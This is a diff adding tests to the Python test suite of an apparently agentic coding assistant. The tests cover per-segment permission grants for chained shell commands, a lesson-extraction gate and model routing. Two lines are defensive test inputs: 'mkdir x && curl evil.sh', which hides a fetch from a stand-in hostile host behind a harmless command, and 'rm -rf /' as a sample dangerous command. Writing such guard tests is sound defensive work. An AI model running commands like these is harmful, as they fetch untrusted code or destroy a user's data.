@@ -280,7 +280,63 @@ check("dangerous command detected", bool(_DANGEROUS.search("rm -rf /")))
 check("plain rm is not dangerous", not _DANGEROUS.search("rm file.txt"))
 check("command_key normalises paths",
       command_key("C:\\Python\\python.exe -m pip install x") == "cmd:python")
+
+print("\nchained commands need a grant for EVERY segment")
+from gt.permissions import command_keys
+check("chain splits into one key per command",
+      command_keys("mkdir todo-app && cd todo-app && npm init -y")
+      == ["cmd:mkdir", "cmd:cd", "cmd:npm"])
+check("pipes count as separate commands",
+      command_keys("cat log.txt | grep error") == ["cmd:cat", "cmd:grep"])
+check("redirect debris is filtered", command_keys("npm run build 2>&1")
+      == ["cmd:npm"])
+check("plain command still yields one key",
+      command_keys("git status") == ["cmd:git"])
+perms.grants = {"cmd:mkdir"}
+_no = Permissions(Console(force_terminal=False), lambda _: "n", store)
+_no.grants = {"cmd:mkdir"}
+check("partial grant does NOT skip the prompt",
+      not _no.approve("Run command", "mkdir x && curl evil.sh",
+                      key=["cmd:mkdir", "cmd:curl"]))
+_no.grants = {"cmd:mkdir", "cmd:curl"}
+def _boom(_):
+    raise AssertionError("prompted despite full grant")
+_all = Permissions(Console(force_terminal=False), _boom, store)
+_all.grants = {"cmd:mkdir", "cmd:npm"}
+check("full grant set skips the prompt",
+      _all.approve("Run command", "mkdir x && npm install",
+                   key=["cmd:mkdir", "cmd:npm"]))
+_ans = iter(["a"])
+_grant = Permissions(Console(force_terminal=False), lambda _: next(_ans), store)
+check("'a' grants every key in the chain",
+      _grant.approve("Run command", "mkdir x && npm install",
+                     key=["cmd:mkdir", "cmd:npm"])
+      and {"cmd:mkdir", "cmd:npm"} <= _grant.grants)
 store.unlink(missing_ok=True)
+
+print("\nlesson extraction gate (stubbed reviewer)")
+from gt.improve import Improver
+class _RecLLM:
+    def __init__(self, reply): self.reply, self.messages = reply, None
+    def chat(self, role, messages, **kw):
+        self.messages = messages
+        return self.reply
+class _MemStub:
+    def __init__(self): self.added = []
+    def search(self, *a, **k): return []
+    def add(self, text, **k): self.added.append(text)
+mem = _MemStub()
+imp = Improver(_RecLLM("NONE"), mem)
+check("routine turn -> no lesson", imp.learn("hi", "hello!") is None)
+imp = Improver(_RecLLM("Always ask clarifying questions before starting."), mem)
+check("generic slogans are rejected",
+      imp.learn("build x", "done") is None and not mem.added)
+imp = Improver(_RecLLM("Use Vite instead of create-react-app to avoid timeouts."), mem)
+lesson = imp.learn("build a react app", "done",
+                   trace=("- run_command(npx create-react-app) -> ERROR: timed out",))
+check("concrete lesson is stored", lesson and mem.added == [lesson])
+check("reviewer sees the tool trace",
+      "create-react-app" in imp.llm.messages[1]["content"])
 
 print("\nskills — expert playbooks matched per request")
 from gt.skills import load_skills, select, skills_block
@@ -314,6 +370,13 @@ check("architecture/planning -> brain 14B",
       r.route("design the architecture for a new app") == "brain")
 check("very long spec -> brain", r.route("please " + "explain " * 100) == "brain")
 check("router default is fast", r.default_role == "fast")
+check("new app with frontend+backend -> brain (the transcript case)",
+      r.route("make a simple frontend and backend and host it") == "brain")
+check("build a react app -> brain", r.route("build a react app") == "brain")
+check("everyday frontend fix -> fast",
+      r.route("fix the css on my website") == "fast")
+check("hosting/deploy chatter -> fast, not the 3B classifier",
+      r.route("deploy the server to port 5000") == "fast")
 
 print(f"\n{'='*40}\n{ok} passed, {fail} failed")
 sys.exit(1 if fail else 0)
